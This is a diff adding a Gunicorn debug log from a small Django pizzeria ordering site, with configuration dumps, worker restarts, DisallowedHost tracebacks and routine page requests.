@@ -1,0 +1,1108 @@
+[2025-02-11 17:49:41 +0000] [18130] [DEBUG] Current configuration:
+  config: ./gunicorn.conf.py
+  wsgi_app: None
+  bind: ['unix:/run/pizza.socket']
+  backlog: 2048
+  workers: 6
+  worker_class: sync
+  threads: 1
+  worker_connections: 1000
+  max_requests: 0
+  max_requests_jitter: 0
+  timeout: 30
+  graceful_timeout: 30
+  keepalive: 2
+  limit_request_line: 4094
+  limit_request_fields: 100
+  limit_request_field_size: 8190
+  reload: False
+  reload_engine: auto
+  reload_extra_files: []
+  spew: False
+  check_config: False
+  print_config: False
+  preload_app: False
+  sendfile: None
+  reuse_port: False
+  chdir: /home/kaikydsousa/PizzariaDjango
+  daemon: False
+  raw_env: []
+  pidfile: None
+  worker_tmp_dir: None
+  user: 1002
+  group: 33
+  umask: 0
+  initgroups: False
+  tmp_upload_dir: None
+  secure_scheme_headers: {'X-FORWARDED-PROTOCOL': 'ssl', 'X-FORWARDED-PROTO': 'https', 'X-FORWARDED-SSL': 'on'}
+  forwarded_allow_ips: ['127.0.0.1', '::1']
+  accesslog: -
+  disable_redirect_access_to_syslog: False
+  access_log_format: %(h)s %(l)s %(u)s %(t)s "%(r)s" %(s)s %(b)s "%(f)s" "%(a)s"
+  errorlog: /home/kaikydsousa/PizzariaDjango/gunicorn-error-log
+  loglevel: debug
+  capture_output: True
+  logger_class: gunicorn.glogging.Logger
+  logconfig: None
+  logconfig_dict: {}
+  logconfig_json: None
+  syslog_addr: udp://localhost:514
+  syslog: False
+  syslog_prefix: None
+  syslog_facility: user
+  enable_stdio_inheritance: True
+  statsd_host: None
+  dogstatsd_tags: 
+  statsd_prefix: 
+  proc_name: None
+  default_proc_name: DjangoProject.wsgi:application
+  pythonpath: None
+  paste: None
+  on_starting: <function OnStarting.on_starting at 0x7f81bf564900>
+  on_reload: <function OnReload.on_reload at 0x7f81bf564a40>
+  when_ready: <function WhenReady.when_ready at 0x7f81bf564b80>
+  pre_fork: <function Prefork.pre_fork at 0x7f81bf564cc0>
+  post_fork: <function Postfork.post_fork at 0x7f81bf564e00>
+  post_worker_init: <function PostWorkerInit.post_worker_init at 0x7f81bf564f40>
+  worker_int: <function WorkerInt.worker_int at 0x7f81bf565080>
+  worker_abort: <function WorkerAbort.worker_abort at 0x7f81bf5651c0>
+  pre_exec: <function PreExec.pre_exec at 0x7f81bf565300>
+  pre_request: <function PreRequest.pre_request at 0x7f81bf565440>
+  post_request: <function PostRequest.post_request at 0x7f81bf5654e0>
+  child_exit: <function ChildExit.child_exit at 0x7f81bf565620>
+  worker_exit: <function WorkerExit.worker_exit at 0x7f81bf565760>
+  nworkers_changed: <function NumWorkersChanged.nworkers_changed at 0x7f81bf5658a0>
+  on_exit: <function OnExit.on_exit at 0x7f81bf5659e0>
+  ssl_context: <function NewSSLContext.ssl_context at 0x7f81bf565bc0>
+  proxy_protocol: False
+  proxy_allow_ips: ['127.0.0.1', '::1']
+  keyfile: None
+  certfile: None
+  ssl_version: 2
+  cert_reqs: 0
+  ca_certs: None
+  suppress_ragged_eofs: True
+  do_handshake_on_connect: False
+  ciphers: None
+  raw_paste_global_conf: []
+  permit_obsolete_folding: False
+  strip_header_spaces: False
+  permit_unconventional_http_method: False
+  permit_unconventional_http_version: False
+  casefold_http_method: False
+  forwarder_headers: ['SCRIPT_NAME', 'PATH_INFO']
+  header_map: drop
+[2025-02-11 17:49:41 +0000] [18130] [INFO] Starting gunicorn 23.0.0
+[2025-02-11 17:49:41 +0000] [18130] [DEBUG] Arbiter booted
+[2025-02-11 17:49:41 +0000] [18130] [INFO] Listening at: unix:/run/pizza.socket (18130)
+[2025-02-11 17:49:41 +0000] [18130] [INFO] Using worker: sync
+[2025-02-11 17:49:41 +0000] [18131] [INFO] Booting worker with pid: 18131
+[2025-02-11 17:49:41 +0000] [18132] [INFO] Booting worker with pid: 18132
+[2025-02-11 17:49:42 +0000] [18133] [INFO] Booting worker with pid: 18133
+[2025-02-11 17:49:42 +0000] [18134] [INFO] Booting worker with pid: 18134
+[2025-02-11 17:49:42 +0000] [18135] [INFO] Booting worker with pid: 18135
+[2025-02-11 17:49:42 +0000] [18136] [INFO] Booting worker with pid: 18136
+[2025-02-11 17:49:42 +0000] [18130] [DEBUG] 6 workers
+[2025-02-11 17:49:42 +0000] [18132] [DEBUG] GET /
+/home/kaikydsousa/PizzariaDjango/pedidos/views.py:16: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'pedidos.models.Produto'> QuerySet.
+  paginator = Paginator(produto_objetos, 4)
+ - - [11/Feb/2025:17:49:42 +0000] "GET / HTTP/1.1" 200 6637 "-" "curl/7.68.0"
+[2025-02-11 17:59:58 +0000] [18133] [DEBUG] GET /
+Invalid HTTP_HOST header: '34.39.141.209'. You may need to add '34.39.141.209' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/utils/deprecation.py", line 128, in __call__
+    response = self.process_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+           ^^^^^^^^^^^^^^^^^^
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '34.39.141.209'. You may need to add '34.39.141.209' to ALLOWED_HOSTS.
+Bad Request: /
+ - - [11/Feb/2025:17:59:58 +0000] "GET / HTTP/1.1" 400 58775 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:04:49 +0000] [18131] [INFO] Worker exiting (pid: 18131)
+[2025-02-11 18:04:49 +0000] [18132] [INFO] Worker exiting (pid: 18132)
+[2025-02-11 18:04:49 +0000] [18134] [INFO] Worker exiting (pid: 18134)
+[2025-02-11 18:04:49 +0000] [18133] [INFO] Worker exiting (pid: 18133)
+[2025-02-11 18:04:49 +0000] [18136] [INFO] Worker exiting (pid: 18136)
+[2025-02-11 18:04:49 +0000] [18135] [INFO] Worker exiting (pid: 18135)
+[2025-02-11 18:04:49 +0000] [18130] [INFO] Handling signal: term
+[2025-02-11 18:04:49 +0000] [18130] [ERROR] Worker (pid:18131) was sent SIGTERM!
+[2025-02-11 18:04:49 +0000] [18130] [ERROR] Worker (pid:18136) was sent SIGTERM!
+[2025-02-11 18:04:49 +0000] [18130] [ERROR] Worker (pid:18132) was sent SIGTERM!
+[2025-02-11 18:04:49 +0000] [18130] [ERROR] Worker (pid:18133) was sent SIGTERM!
+[2025-02-11 18:04:49 +0000] [18130] [ERROR] Worker (pid:18134) was sent SIGTERM!
+[2025-02-11 18:04:49 +0000] [18130] [ERROR] Worker (pid:18135) was sent SIGTERM!
+[2025-02-11 18:04:49 +0000] [18130] [INFO] Shutting down: Master
+[2025-02-11 18:04:49 +0000] [18591] [DEBUG] Current configuration:
+  config: ./gunicorn.conf.py
+  wsgi_app: None
+  bind: ['unix:/run/pizza.socket']
+  backlog: 2048
+  workers: 6
+  worker_class: sync
+  threads: 1
+  worker_connections: 1000
+  max_requests: 0
+  max_requests_jitter: 0
+  timeout: 30
+  graceful_timeout: 30
+  keepalive: 2
+  limit_request_line: 4094
+  limit_request_fields: 100
+  limit_request_field_size: 8190
+  reload: False
+  reload_engine: auto
+  reload_extra_files: []
+  spew: False
+  check_config: False
+  print_config: False
+  preload_app: False
+  sendfile: None
+  reuse_port: False
+  chdir: /home/kaikydsousa/PizzariaDjango
+  daemon: False
+  raw_env: []
+  pidfile: None
+  worker_tmp_dir: None
+  user: 1002
+  group: 33
+  umask: 0
+  initgroups: False
+  tmp_upload_dir: None
+  secure_scheme_headers: {'X-FORWARDED-PROTOCOL': 'ssl', 'X-FORWARDED-PROTO': 'https', 'X-FORWARDED-SSL': 'on'}
+  forwarded_allow_ips: ['127.0.0.1', '::1']
+  accesslog: -
+  disable_redirect_access_to_syslog: False
+  access_log_format: %(h)s %(l)s %(u)s %(t)s "%(r)s" %(s)s %(b)s "%(f)s" "%(a)s"
+  errorlog: /home/kaikydsousa/PizzariaDjango/gunicorn-error-log
+  loglevel: debug
+  capture_output: True
+  logger_class: gunicorn.glogging.Logger
+  logconfig: None
+  logconfig_dict: {}
+  logconfig_json: None
+  syslog_addr: udp://localhost:514
+  syslog: False
+  syslog_prefix: None
+  syslog_facility: user
+  enable_stdio_inheritance: True
+  statsd_host: None
+  dogstatsd_tags: 
+  statsd_prefix: 
+  proc_name: None
+  default_proc_name: DjangoProject.wsgi:application
+  pythonpath: None
+  paste: None
+  on_starting: <function OnStarting.on_starting at 0x7f6102050900>
+  on_reload: <function OnReload.on_reload at 0x7f6102050a40>
+  when_ready: <function WhenReady.when_ready at 0x7f6102050b80>
+  pre_fork: <function Prefork.pre_fork at 0x7f6102050cc0>
+  post_fork: <function Postfork.post_fork at 0x7f6102050e00>
+  post_worker_init: <function PostWorkerInit.post_worker_init at 0x7f6102050f40>
+  worker_int: <function WorkerInt.worker_int at 0x7f6102051080>
+  worker_abort: <function WorkerAbort.worker_abort at 0x7f61020511c0>
+  pre_exec: <function PreExec.pre_exec at 0x7f6102051300>
+  pre_request: <function PreRequest.pre_request at 0x7f6102051440>
+  post_request: <function PostRequest.post_request at 0x7f61020514e0>
+  child_exit: <function ChildExit.child_exit at 0x7f6102051620>
+  worker_exit: <function WorkerExit.worker_exit at 0x7f6102051760>
+  nworkers_changed: <function NumWorkersChanged.nworkers_changed at 0x7f61020518a0>
+  on_exit: <function OnExit.on_exit at 0x7f61020519e0>
+  ssl_context: <function NewSSLContext.ssl_context at 0x7f6102051bc0>
+  proxy_protocol: False
+  proxy_allow_ips: ['127.0.0.1', '::1']
+  keyfile: None
+  certfile: None
+  ssl_version: 2
+  cert_reqs: 0
+  ca_certs: None
+  suppress_ragged_eofs: True
+  do_handshake_on_connect: False
+  ciphers: None
+  raw_paste_global_conf: []
+  permit_obsolete_folding: False
+  strip_header_spaces: False
+  permit_unconventional_http_method: False
+  permit_unconventional_http_version: False
+  casefold_http_method: False
+  forwarder_headers: ['SCRIPT_NAME', 'PATH_INFO']
+  header_map: drop
+[2025-02-11 18:04:49 +0000] [18591] [INFO] Starting gunicorn 23.0.0
+[2025-02-11 18:04:49 +0000] [18591] [DEBUG] Arbiter booted
+[2025-02-11 18:04:49 +0000] [18591] [INFO] Listening at: unix:/run/pizza.socket (18591)
+[2025-02-11 18:04:49 +0000] [18591] [INFO] Using worker: sync
+[2025-02-11 18:04:49 +0000] [18592] [INFO] Booting worker with pid: 18592
+[2025-02-11 18:04:49 +0000] [18593] [INFO] Booting worker with pid: 18593
+[2025-02-11 18:04:49 +0000] [18594] [INFO] Booting worker with pid: 18594
+[2025-02-11 18:04:49 +0000] [18595] [INFO] Booting worker with pid: 18595
+[2025-02-11 18:04:49 +0000] [18596] [INFO] Booting worker with pid: 18596
+[2025-02-11 18:04:49 +0000] [18597] [INFO] Booting worker with pid: 18597
+[2025-02-11 18:04:49 +0000] [18591] [DEBUG] 6 workers
+[2025-02-11 18:05:12 +0000] [18592] [DEBUG] GET /
+Invalid HTTP_HOST header: '34.39.141.209'. You may need to add '34.39.141.209' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/utils/deprecation.py", line 128, in __call__
+    response = self.process_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+           ^^^^^^^^^^^^^^^^^^
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '34.39.141.209'. You may need to add '34.39.141.209' to ALLOWED_HOSTS.
+Bad Request: /
+ - - [11/Feb/2025:18:05:12 +0000] "GET / HTTP/1.1" 400 58460 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:05:13 +0000] [18594] [DEBUG] GET /
+Invalid HTTP_HOST header: '34.39.141.209'. You may need to add '34.39.141.209' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/utils/deprecation.py", line 128, in __call__
+    response = self.process_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+           ^^^^^^^^^^^^^^^^^^
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '34.39.141.209'. You may need to add '34.39.141.209' to ALLOWED_HOSTS.
+Bad Request: /
+ - - [11/Feb/2025:18:05:13 +0000] "GET / HTTP/1.1" 400 58460 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:06:16 +0000] [18591] [INFO] Handling signal: term
+[2025-02-11 18:06:16 +0000] [18593] [INFO] Worker exiting (pid: 18593)
+[2025-02-11 18:06:16 +0000] [18595] [INFO] Worker exiting (pid: 18595)
+[2025-02-11 18:06:16 +0000] [18596] [INFO] Worker exiting (pid: 18596)
+[2025-02-11 18:06:16 +0000] [18594] [INFO] Worker exiting (pid: 18594)
+[2025-02-11 18:06:16 +0000] [18592] [INFO] Worker exiting (pid: 18592)
+[2025-02-11 18:06:16 +0000] [18597] [INFO] Worker exiting (pid: 18597)
+[2025-02-11 18:06:16 +0000] [18591] [INFO] Shutting down: Master
+[2025-02-11 18:06:16 +0000] [18676] [DEBUG] Current configuration:
+  config: ./gunicorn.conf.py
+  wsgi_app: None
+  bind: ['unix:/run/pizza.socket']
+  backlog: 2048
+  workers: 6
+  worker_class: sync
+  threads: 1
+  worker_connections: 1000
+  max_requests: 0
+  max_requests_jitter: 0
+  timeout: 30
+  graceful_timeout: 30
+  keepalive: 2
+  limit_request_line: 4094
+  limit_request_fields: 100
+  limit_request_field_size: 8190
+  reload: False
+  reload_engine: auto
+  reload_extra_files: []
+  spew: False
+  check_config: False
+  print_config: False
+  preload_app: False
+  sendfile: None
+  reuse_port: False
+  chdir: /home/kaikydsousa/PizzariaDjango
+  daemon: False
+  raw_env: []
+  pidfile: None
+  worker_tmp_dir: None
+  user: 1002
+  group: 33
+  umask: 0
+  initgroups: False
+  tmp_upload_dir: None
+  secure_scheme_headers: {'X-FORWARDED-PROTOCOL': 'ssl', 'X-FORWARDED-PROTO': 'https', 'X-FORWARDED-SSL': 'on'}
+  forwarded_allow_ips: ['127.0.0.1', '::1']
+  accesslog: -
+  disable_redirect_access_to_syslog: False
+  access_log_format: %(h)s %(l)s %(u)s %(t)s "%(r)s" %(s)s %(b)s "%(f)s" "%(a)s"
+  errorlog: /home/kaikydsousa/PizzariaDjango/gunicorn-error-log
+  loglevel: debug
+  capture_output: True
+  logger_class: gunicorn.glogging.Logger
+  logconfig: None
+  logconfig_dict: {}
+  logconfig_json: None
+  syslog_addr: udp://localhost:514
+  syslog: False
+  syslog_prefix: None
+  syslog_facility: user
+  enable_stdio_inheritance: True
+  statsd_host: None
+  dogstatsd_tags: 
+  statsd_prefix: 
+  proc_name: None
+  default_proc_name: DjangoProject.wsgi:application
+  pythonpath: None
+  paste: None
+  on_starting: <function OnStarting.on_starting at 0x7f5ebde10900>
+  on_reload: <function OnReload.on_reload at 0x7f5ebde10a40>
+  when_ready: <function WhenReady.when_ready at 0x7f5ebde10b80>
+  pre_fork: <function Prefork.pre_fork at 0x7f5ebde10cc0>
+  post_fork: <function Postfork.post_fork at 0x7f5ebde10e00>
+  post_worker_init: <function PostWorkerInit.post_worker_init at 0x7f5ebde10f40>
+  worker_int: <function WorkerInt.worker_int at 0x7f5ebde11080>
+  worker_abort: <function WorkerAbort.worker_abort at 0x7f5ebde111c0>
+  pre_exec: <function PreExec.pre_exec at 0x7f5ebde11300>
+  pre_request: <function PreRequest.pre_request at 0x7f5ebde11440>
+  post_request: <function PostRequest.post_request at 0x7f5ebde114e0>
+  child_exit: <function ChildExit.child_exit at 0x7f5ebde11620>
+  worker_exit: <function WorkerExit.worker_exit at 0x7f5ebde11760>
+  nworkers_changed: <function NumWorkersChanged.nworkers_changed at 0x7f5ebde118a0>
+  on_exit: <function OnExit.on_exit at 0x7f5ebde119e0>
+  ssl_context: <function NewSSLContext.ssl_context at 0x7f5ebde11bc0>
+  proxy_protocol: False
+  proxy_allow_ips: ['127.0.0.1', '::1']
+  keyfile: None
+  certfile: None
+  ssl_version: 2
+  cert_reqs: 0
+  ca_certs: None
+  suppress_ragged_eofs: True
+  do_handshake_on_connect: False
+  ciphers: None
+  raw_paste_global_conf: []
+  permit_obsolete_folding: False
+  strip_header_spaces: False
+  permit_unconventional_http_method: False
+  permit_unconventional_http_version: False
+  casefold_http_method: False
+  forwarder_headers: ['SCRIPT_NAME', 'PATH_INFO']
+  header_map: drop
+[2025-02-11 18:06:16 +0000] [18676] [INFO] Starting gunicorn 23.0.0
+[2025-02-11 18:06:16 +0000] [18676] [DEBUG] Arbiter booted
+[2025-02-11 18:06:16 +0000] [18676] [INFO] Listening at: unix:/run/pizza.socket (18676)
+[2025-02-11 18:06:16 +0000] [18676] [INFO] Using worker: sync
+[2025-02-11 18:06:16 +0000] [18677] [INFO] Booting worker with pid: 18677
+[2025-02-11 18:06:16 +0000] [18678] [INFO] Booting worker with pid: 18678
+[2025-02-11 18:06:17 +0000] [18679] [INFO] Booting worker with pid: 18679
+[2025-02-11 18:06:17 +0000] [18680] [INFO] Booting worker with pid: 18680
+[2025-02-11 18:06:17 +0000] [18681] [INFO] Booting worker with pid: 18681
+[2025-02-11 18:06:17 +0000] [18682] [INFO] Booting worker with pid: 18682
+[2025-02-11 18:06:17 +0000] [18676] [DEBUG] 6 workers
+[2025-02-11 18:06:27 +0000] [18679] [INFO] Worker exiting (pid: 18679)
+[2025-02-11 18:06:27 +0000] [18677] [INFO] Worker exiting (pid: 18677)
+[2025-02-11 18:06:27 +0000] [18676] [INFO] Handling signal: term
+[2025-02-11 18:06:27 +0000] [18678] [INFO] Worker exiting (pid: 18678)
+[2025-02-11 18:06:27 +0000] [18680] [INFO] Worker exiting (pid: 18680)
+[2025-02-11 18:06:27 +0000] [18682] [INFO] Worker exiting (pid: 18682)
+[2025-02-11 18:06:27 +0000] [18676] [ERROR] Worker (pid:18677) was sent SIGTERM!
+[2025-02-11 18:06:27 +0000] [18681] [INFO] Worker exiting (pid: 18681)
+[2025-02-11 18:06:27 +0000] [18676] [ERROR] Worker (pid:18679) was sent SIGTERM!
+[2025-02-11 18:06:27 +0000] [18676] [INFO] Shutting down: Master
+[2025-02-11 18:06:27 +0000] [18698] [DEBUG] Current configuration:
+  config: ./gunicorn.conf.py
+  wsgi_app: None
+  bind: ['unix:/run/pizza.socket']
+  backlog: 2048
+  workers: 6
+  worker_class: sync
+  threads: 1
+  worker_connections: 1000
+  max_requests: 0
+  max_requests_jitter: 0
+  timeout: 30
+  graceful_timeout: 30
+  keepalive: 2
+  limit_request_line: 4094
+  limit_request_fields: 100
+  limit_request_field_size: 8190
+  reload: False
+  reload_engine: auto
+  reload_extra_files: []
+  spew: False
+  check_config: False
+  print_config: False
+  preload_app: False
+  sendfile: None
+  reuse_port: False
+  chdir: /home/kaikydsousa/PizzariaDjango
+  daemon: False
+  raw_env: []
+  pidfile: None
+  worker_tmp_dir: None
+  user: 1002
+  group: 33
+  umask: 0
+  initgroups: False
+  tmp_upload_dir: None
+  secure_scheme_headers: {'X-FORWARDED-PROTOCOL': 'ssl', 'X-FORWARDED-PROTO': 'https', 'X-FORWARDED-SSL': 'on'}
+  forwarded_allow_ips: ['127.0.0.1', '::1']
+  accesslog: -
+  disable_redirect_access_to_syslog: False
+  access_log_format: %(h)s %(l)s %(u)s %(t)s "%(r)s" %(s)s %(b)s "%(f)s" "%(a)s"
+  errorlog: /home/kaikydsousa/PizzariaDjango/gunicorn-error-log
+  loglevel: debug
+  capture_output: True
+  logger_class: gunicorn.glogging.Logger
+  logconfig: None
+  logconfig_dict: {}
+  logconfig_json: None
+  syslog_addr: udp://localhost:514
+  syslog: False
+  syslog_prefix: None
+  syslog_facility: user
+  enable_stdio_inheritance: True
+  statsd_host: None
+  dogstatsd_tags: 
+  statsd_prefix: 
+  proc_name: None
+  default_proc_name: DjangoProject.wsgi:application
+  pythonpath: None
+  paste: None
+  on_starting: <function OnStarting.on_starting at 0x7f985ea48900>
+  on_reload: <function OnReload.on_reload at 0x7f985ea48a40>
+  when_ready: <function WhenReady.when_ready at 0x7f985ea48b80>
+  pre_fork: <function Prefork.pre_fork at 0x7f985ea48cc0>
+  post_fork: <function Postfork.post_fork at 0x7f985ea48e00>
+  post_worker_init: <function PostWorkerInit.post_worker_init at 0x7f985ea48f40>
+  worker_int: <function WorkerInt.worker_int at 0x7f985ea49080>
+  worker_abort: <function WorkerAbort.worker_abort at 0x7f985ea491c0>
+  pre_exec: <function PreExec.pre_exec at 0x7f985ea49300>
+  pre_request: <function PreRequest.pre_request at 0x7f985ea49440>
+  post_request: <function PostRequest.post_request at 0x7f985ea494e0>
+  child_exit: <function ChildExit.child_exit at 0x7f985ea49620>
+  worker_exit: <function WorkerExit.worker_exit at 0x7f985ea49760>
+  nworkers_changed: <function NumWorkersChanged.nworkers_changed at 0x7f985ea498a0>
+  on_exit: <function OnExit.on_exit at 0x7f985ea499e0>
+  ssl_context: <function NewSSLContext.ssl_context at 0x7f985ea49bc0>
+  proxy_protocol: False
+  proxy_allow_ips: ['127.0.0.1', '::1']
+  keyfile: None
+  certfile: None
+  ssl_version: 2
+  cert_reqs: 0
+  ca_certs: None
+  suppress_ragged_eofs: True
+  do_handshake_on_connect: False
+  ciphers: None
+  raw_paste_global_conf: []
+  permit_obsolete_folding: False
+  strip_header_spaces: False
+  permit_unconventional_http_method: False
+  permit_unconventional_http_version: False
+  casefold_http_method: False
+  forwarder_headers: ['SCRIPT_NAME', 'PATH_INFO']
+  header_map: drop
+[2025-02-11 18:06:27 +0000] [18698] [INFO] Starting gunicorn 23.0.0
+[2025-02-11 18:06:27 +0000] [18698] [DEBUG] Arbiter booted
+[2025-02-11 18:06:27 +0000] [18698] [INFO] Listening at: unix:/run/pizza.socket (18698)
+[2025-02-11 18:06:27 +0000] [18698] [INFO] Using worker: sync
+[2025-02-11 18:06:27 +0000] [18699] [INFO] Booting worker with pid: 18699
+[2025-02-11 18:06:27 +0000] [18700] [INFO] Booting worker with pid: 18700
+[2025-02-11 18:06:27 +0000] [18701] [INFO] Booting worker with pid: 18701
+[2025-02-11 18:06:27 +0000] [18702] [INFO] Booting worker with pid: 18702
+[2025-02-11 18:06:27 +0000] [18703] [INFO] Booting worker with pid: 18703
+[2025-02-11 18:06:27 +0000] [18705] [INFO] Booting worker with pid: 18705
+[2025-02-11 18:06:28 +0000] [18698] [DEBUG] 6 workers
+[2025-02-11 18:06:33 +0000] [18699] [DEBUG] GET /
+/home/kaikydsousa/PizzariaDjango/pedidos/views.py:16: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'pedidos.models.Produto'> QuerySet.
+  paginator = Paginator(produto_objetos, 4)
+ - - [11/Feb/2025:18:06:33 +0000] "GET / HTTP/1.1" 200 6637 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:06:49 +0000] [18700] [DEBUG] GET /checkout
+ - - [11/Feb/2025:18:06:49 +0000] "GET /checkout HTTP/1.1" 301 0 "http://34.39.141.209/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:06:49 +0000] [18700] [DEBUG] GET /checkout/
+ - - [11/Feb/2025:18:06:49 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:06:58 +0000] [18702] [DEBUG] GET /
+/home/kaikydsousa/PizzariaDjango/pedidos/views.py:16: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'pedidos.models.Produto'> QuerySet.
+  paginator = Paginator(produto_objetos, 4)
+ - - [11/Feb/2025:18:06:58 +0000] "GET /?page= HTTP/1.1" 200 6637 "http://34.39.141.209/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:08:03 +0000] [18705] [DEBUG] GET /
+/home/kaikydsousa/PizzariaDjango/pedidos/views.py:16: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'pedidos.models.Produto'> QuerySet.
+  paginator = Paginator(produto_objetos, 4)
+ - - [11/Feb/2025:18:08:03 +0000] "GET / HTTP/1.1" 200 6637 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:08:53 +0000] [18699] [DEBUG] GET /checkout/
+ - - [11/Feb/2025:18:08:53 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:09:20 +0000] [18700] [DEBUG] GET /checkout/
+ - - [11/Feb/2025:18:09:20 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:11:23 +0000] [18703] [DEBUG] GET /checkout/
+ - - [11/Feb/2025:18:11:23 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:11:25 +0000] [18701] [DEBUG] GET /
+/home/kaikydsousa/PizzariaDjango/pedidos/views.py:16: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'pedidos.models.Produto'> QuerySet.
+  paginator = Paginator(produto_objetos, 4)
+ - - [11/Feb/2025:18:11:25 +0000] "GET / HTTP/1.1" 200 6637 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:14:46 +0000] [18702] [DEBUG] GET /
+ - - [11/Feb/2025:18:14:46 +0000] "GET / HTTP/1.1" 200 6637 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:14:47 +0000] [18702] [DEBUG] GET /
+ - - [11/Feb/2025:18:14:47 +0000] "GET / HTTP/1.1" 200 6637 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:15:06 +0000] [18703] [DEBUG] GET /
+/home/kaikydsousa/PizzariaDjango/pedidos/views.py:16: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'pedidos.models.Produto'> QuerySet.
+  paginator = Paginator(produto_objetos, 4)
+ - - [11/Feb/2025:18:15:06 +0000] "GET / HTTP/1.1" 200 6637 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-11 18:15:51 +0000] [18705] [DEBUG] GET /
+ - - [11/Feb/2025:18:15:51 +0000] "GET / HTTP/1.1" 200 6637 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 18:15:56 +0000] [18700] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [11/Feb/2025:18:15:56 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 18:16:17 +0000] [18703] [DEBUG] GET /checkout
